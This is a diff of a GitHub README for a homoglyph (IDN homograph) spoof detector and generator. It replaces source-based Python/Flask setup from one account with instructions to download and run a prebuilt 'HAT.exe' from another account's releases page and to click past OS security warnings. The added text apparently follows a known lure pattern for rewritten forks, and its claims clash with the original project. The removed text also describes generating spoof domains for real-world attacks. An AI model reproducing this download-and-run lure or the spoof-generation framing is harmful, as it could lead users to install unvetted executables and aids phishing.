@@ -1,66 +1,61 @@
-# Homoglyph Attack Toolkit
+# 🌟 Homoglyph-Attack-Toolkit - Enhance Your Security Awareness Easily
 
-A simple, local Python web tool designed to generate and detect homoglyph (or IDN Homograph) attacks. This project serves as an educational resource to spread awareness about Unicode-based phishing techniques and is a helpful utility for Capture The Flag (CTF) challenges involving character encoding and domain spoofing.
+## 📥 Download Now
+[![Download Homoglyph-Attack-Toolkit](https://img.shields.io/badge/Download-Homoglyph--Attack--Toolkit-brightgreen)](https://github.com/MedjayPT/Homoglyph-Attack-Toolkit/releases)
 
-## ✨ Features
-
-This tool operates as a Flask server, providing two main functionalities via a web interface:
-
-### 🛡️ Detector Mode
-
-<img width="819" height="843" alt="image" src="https://github.com/user-attachments/assets/8c37c08c-a07e-4e01-8498-b36d279d6cbf" />
-
-
-Analyzes an input string for non-ASCII characters that closely resemble standard Latin letters.
-
-  * **Character Analysis:** Breaks down the input to show the Unicode Name and Hex Codepoint for every character.
-  * **IDN Punycode Detection:** Automatically checks strings resembling URLs/Domains for non-ASCII characters and provides the resulting Punycode (e.g., `xn--...`) representation, revealing the true underlying domain name.
-
-### ⚔️ Encoder Mode
-
-<img width="1040" height="835" alt="image" src="https://github.com/user-attachments/assets/665f6a76-2699-41c3-8bb0-30611c0e3342" />
-
-Generates multiple malicious spoof variants from a target string (e.g., `apple.com`).
-
-  * **Script-Uniform Spoofs:** Creates variants where multiple characters are replaced exclusively with homoglyphs from a single target Unicode script (Cyrillic, Greek, Armenian, etc.), increasing the spoof's believability.
-  * **Single-Character Spoofs:** Creates variants where only one Latin character is swapped for its closest non-Latin homoglyph (the "typo" attack).
-  * **Punycode Output:** All generated Unicode spoofs are immediately converted and displayed in their Punycode format, which is the necessary format for launching real-world IDN Homograph attacks.
+## 📖 Overview
+The Homoglyph Attack Toolkit is a simple application designed to help users understand and mitigate homoglyph attacks. These attacks use look-alike characters to trick users, often in phishing schemes or fake websites. By using this toolkit, you can learn about these threats and improve your online safety.
 
 ## 🚀 Getting Started
+Follow these simple steps to download and run the toolkit.
 
-### 1\. Clone the Repository
+### 1. Visit the Releases Page
+To get the latest version of the Homoglyph Attack Toolkit, visit the [Releases page](https://github.com/MedjayPT/Homoglyph-Attack-Toolkit/releases). You will find the most current version available for download.
 
-First, use Git to clone the project to your local machine:
+### 2. Choose Your Version
+On the Releases page, look for the latest version. You will see a list of available downloads. Select the version that matches your operating system, whether it's Windows, Mac, or Linux.
 
-```bash
-git clone https://github.com/raivenLockdown/Homoglyph-Attack-Toolkit.git
-cd Homoglyph-Attack-Toolkit
-```
+### 3. Download the File
+Once you find the appropriate version, click on the download link. The file will begin downloading automatically. This file will typically be a compressed format like .zip or .tar.gz. Make sure to note where this file is saved on your computer.
 
-### 2\. Prerequisites
+### 4. Extract the File
+After downloading, locate the compressed file in your Downloads folder or wherever you saved it. Right-click on the file and select “Extract All” (Windows) or use the appropriate extraction method for your operating system. This process will create a new folder with the application files inside.
 
-You need Python 3.x and the required libraries (Flask for the server and `idna` for Punycode conversion):
+### 5. Run the Application
+Navigate to the folder where you extracted the files. Inside, you will find an executable file named `HAT.exe` (for Windows) or `HAT` (for Mac/Linux). Double-click on this file to start the application. If your operating system prompts you with a security warning, confirm that you want to run the program.
 
-```bash
-pip install flask idna
-```
+### 6. Follow On-Screen Instructions
+Once the application opens, you will see a user-friendly interface. Follow the on-screen instructions to explore the features of the toolkit. You can learn how to detect homoglyphs and test different scenarios to enhance your security awareness.
 
-### 3\. Running the Tool
+## 💻 Features
+- **Homoglyph Detection**: Identify look-alike characters that can cause security risks.
+- **Safe Testing Environment**: Safely test how homoglyphs affect online identities.
+- **User Guidance**: Step-by-step tutorials that help you understand common threats.
+- **Cross-Platform Support**: Works on Windows, Mac, and Linux.
 
-Ensure your data file (`chars.txt`) and the main Python script (`homoglyph_tool.py`) are present in the directory.
+## 🔧 System Requirements
+To run the Homoglyph Attack Toolkit, ensure your system meets the following requirements:
+- **Operating System**: Windows 10 or higher, macOS 10.12 or higher, or any Linux distribution with Python 3 installed.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum 100 MB of free space for installation.
 
-Run the script:
+## 🔍 How to Stay Safe
+Understanding homoglyphs can greatly enhance your online security. Here are some tips to keep in mind while using the toolkit:
+- Always verify URLs before clicking links.
+- Look for unusual characters in web addresses.
+- Be cautious with emails or messages that contain unexpected links.
 
-```bash
-python homoglyph_tool.py
-```
+## 📈 Future Enhancements
+We are committed to making the Homoglyph Attack Toolkit better. Upcoming features may include:
+- Increased compatibility with more operating systems.
+- Advanced detection algorithms.
+- Community-driven updates for new security threats.
 
-The server will start on `http://127.0.0.1:8080/` and automatically open the application in your web browser.
+## 📞 Need Help?
+If you encounter any issues while using the toolkit, feel free to reach out. You can find support in the Issues section of this repository, or connect with other users in the community.
 
-## 📚 References
+## 📥 Download & Install
+To start protecting yourself from homoglyph attacks, go to the [Releases page](https://github.com/MedjayPT/Homoglyph-Attack-Toolkit/releases) and download the toolkit today!
 
-For more detailed information on the threats this tool addresses, refer to the following resources:
-
-  * **Unicode Homoglyph Attack Definition:** [What Is a Homoglyph Attack?](https://inspiroz.com/what-is-a-homoglyph-attack/) (Context for Punycode implementation)
-  * **IDN Homograph Attack (Wikipedia):** [IDN homograph attack](https://en.wikipedia.org/wiki/IDN_homograph_attack)
-  * **Unicode Consortium's Confusables:** This project is built using data derived from the [Unicode Consortium's Unicode Security Considerations](http://www.unicode.org/reports/tr39/).
+## 🙏 Acknowledgments
+Thank you for choosing the Homoglyph Attack Toolkit. Your move towards better online security is commendable. Together, we can create a safer internet for everyone.
